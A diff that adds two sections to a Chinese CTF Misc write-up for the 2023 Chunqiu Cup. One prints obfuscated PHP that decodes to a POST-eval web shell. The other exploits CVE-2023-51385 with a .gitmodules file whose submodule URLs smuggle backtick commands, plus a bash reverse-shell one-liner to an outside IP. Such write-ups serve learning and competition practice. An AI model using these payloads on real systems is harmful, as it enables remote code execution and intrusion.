@@ -12,7 +12,7 @@
   <meta itemprop="description" content="后来再回头看自己当初没做出来的题，也是感触颇深">
   <meta itemprop="datePublished" content="2024-07-17T20:31:08+08:00">
   <meta itemprop="dateModified" content="2024-07-17T20:31:08+08:00">
-  <meta itemprop="wordCount" content="105">
+  <meta itemprop="wordCount" content="218">
   <meta itemprop="keywords" content="CTF"><meta property="og:url" content="http://localhost:1313/posts/5de0d7e/">
   <meta property="og:site_name" content="⚡Lunatic BLOG⚡">
   <meta property="og:title" content="2023 春秋杯冬季赛 Misc Writeup">
@@ -39,7 +39,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/5de0d7e\/"
-    },"genre": "posts","keywords": "CTF","wordcount":  105 ,
+    },"genre": "posts","keywords": "CTF","wordcount":  218 ,
     "url": "http:\/\/localhost:1313\/posts\/5de0d7e\/","datePublished": "2024-07-17T20:31:08+08:00","dateModified": "2024-07-17T20:31:08+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -143,7 +143,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2023 春秋杯冬季赛 Misc Writeup</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="https://goodlunatic.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.nssctf.cn/files/2024/4/28/7f130a1387.png" alt="Lunatic" data-title="Lunatic" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Lunatic</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-07-17 20:31:08"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-07-17">2024-07-17</time></span>&nbsp;<span title="105 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>One minute</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><a href="https://goodlunatic.github.io" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://www.nssctf.cn/files/2024/4/28/7f130a1387.png" alt="Lunatic" data-title="Lunatic" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Lunatic</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-07-17 20:31:08"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-07-17">2024-07-17</time></span>&nbsp;<span title="218 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,6 +152,8 @@
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#谁偷吃的了我的外卖">谁偷吃的了我的外卖</a></li>
+    <li><a href="#明文混淆">明文混淆</a></li>
+    <li><a href="#module">Module</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p>后来再回头看自己当初没做出来的题，也是感触颇深</p>
@@ -204,7 +206,104 @@
 <p>方法二：bkcrack</p>
 <p>把 钥匙.png 用 bandzip 的 正常压缩格式 压缩为 flag.zip，然后爆破密钥即可</p>
 <p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717204906602.png" alt="/posts/5de0d7e/imgs/image-20240717204906602.png" srcset="/posts/5de0d7e/imgs/image-20240717204906602.png?size=small, /posts/5de0d7e/imgs/image-20240717204906602.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717204906602.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717204906602.png" style="--width: 1734px;--aspect-ratio: 1734 / 927;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>CyberChef 中 reverse 一下即可得到最后的 flag：flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}</p></div><div class="post-footer" id="post-footer">
+<p>CyberChef 中 reverse 一下即可得到最后的 flag：flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}</p>
+<h2 id="明文混淆" class="heading-element">
+  <a href="#%e6%98%8e%e6%96%87%e6%b7%b7%e6%b7%86" class="heading-mark"></a>明文混淆</h2><p>附件给了一个压缩包，打开一看发现是 store 加密，因此猜测需要明文攻击</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211823123.png" alt="/posts/5de0d7e/imgs/image-20240717211823123.png" srcset="/posts/5de0d7e/imgs/image-20240717211823123.png?size=small, /posts/5de0d7e/imgs/image-20240717211823123.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211823123.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211823123.png" style="--width: 2056px;--aspect-ratio: 2056 / 1003;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>去网上搜了一下文件大小为 35821 的 LICENSE.txt，发现有个统一的标题</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211804575.png" alt="/posts/5de0d7e/imgs/image-20240717211804575.png" srcset="/posts/5de0d7e/imgs/image-20240717211804575.png?size=small, /posts/5de0d7e/imgs/image-20240717211804575.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211804575.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211804575.png" style="--width: 3280px;--aspect-ratio: 3280 / 1984;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717211914785.png" alt="/posts/5de0d7e/imgs/image-20240717211914785.png" srcset="/posts/5de0d7e/imgs/image-20240717211914785.png?size=small, /posts/5de0d7e/imgs/image-20240717211914785.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717211914785.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717211914785.png" style="--width: 1990px;--aspect-ratio: 1990 / 1259;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个标题的长度也满足了明文攻击的要求，因此我们使用 bkcrack 进行明文攻击</p>
+<p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717212014643.png" alt="/posts/5de0d7e/imgs/image-20240717212014643.png" srcset="/posts/5de0d7e/imgs/image-20240717212014643.png?size=small, /posts/5de0d7e/imgs/image-20240717212014643.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717212014643.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717212014643.png" style="--width: 1734px;--aspect-ratio: 1734 / 927;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在 shell2.php 中得到以下 php 代码，是微盾php混淆</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00OO0</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;</span><span class="p">);</span><span class="nv">$O00O0O</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">6</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="nv">$O0OO00</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$OO0O00</span><span class="o">=</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">18</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$OO0000</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">7</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">13</span><span class="p">};</span><span class="nv">$O00O0O</span><span class="o">.=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">22</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">36</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">29</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">32</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">35</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="k">eval</span><span class="p">(</span><span class="nv">$O00O0O</span><span class="p">(</span><span class="s2">&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里这道题比较简单，只要按照步骤依次 echo 出来就能得到 flag</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00OO0</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00O0O</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">6</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O0OO00</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$OO0O00</span><span class="o">=</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">18</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$O0OO00</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$OO0000</span><span class="o">=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">7</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">13</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O00O0O</span><span class="o">.=</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">22</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">36</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">29</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">32</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">35</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$O00OO0</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$O00O0O</span><span class="p">(</span><span class="s2">&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//echo $O00O0O(&#34;JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$O0O000</span><span class="o">=</span><span class="s2">&#34;uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*eval(&#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*echo &#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000)));*/</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;)));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">gzinflate</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//eval(@$_POST[&#39;flag{s1mpL3_z1p_@nd_w365heLl!!!}&#39;]);?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag{s1mpL3_z1p_@nd_w365heLl!!!}'</p>
+<h2 id="module" class="heading-element">
+  <a href="#module" class="heading-mark"></a>Module</h2><p>CVE-2023-51385</p>
+<p>参考博客：</p>
+<p><a href="https://blog.csdn.net/weixin_46944519/article/details/135249657"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_46944519/article/details/135249657</a></p>
+<p>在国内的 Gitee 上新建一个仓库包含以下两个文件，然后直接 git clone -v  项目地址 &ndash;recurse-submodules 即可</p>
+<p>.gitmodules 文件内容如下：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[submodule &#34;cve&#34;]
+</span></span><span class="line"><span class="cl">	path = cve
+</span></span><span class="line"><span class="cl">	url = https://`echo helloworld &gt; cve.txt`foo.ichunqiu.com/bar
+</span></span><span class="line"><span class="cl">[submodule &#34;test&#34;]
+</span></span><span class="line"><span class="cl">	path = test
+</span></span><span class="line"><span class="cl">	url = ssh://`bash shell.sh`foo.ichunqiu.com/bar</span></span></code></pre></td></tr></table>
+</div>
+</div><p>shell.sh 内容如下：</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;exec bash -i &amp;&gt;/dev/tcp/8.130.93.84/3232 &lt;&amp;1&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/5de0d7e/imgs/image-20240717215804819.png" alt="/posts/5de0d7e/imgs/image-20240717215804819.png" srcset="/posts/5de0d7e/imgs/image-20240717215804819.png?size=small, /posts/5de0d7e/imgs/image-20240717215804819.png?size=medium 1.5x, /posts/5de0d7e/imgs/image-20240717215804819.png?size=large 2x" data-title="/posts/5de0d7e/imgs/image-20240717215804819.png" style="--width: 2047px;--aspect-ratio: 2047 / 1282;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
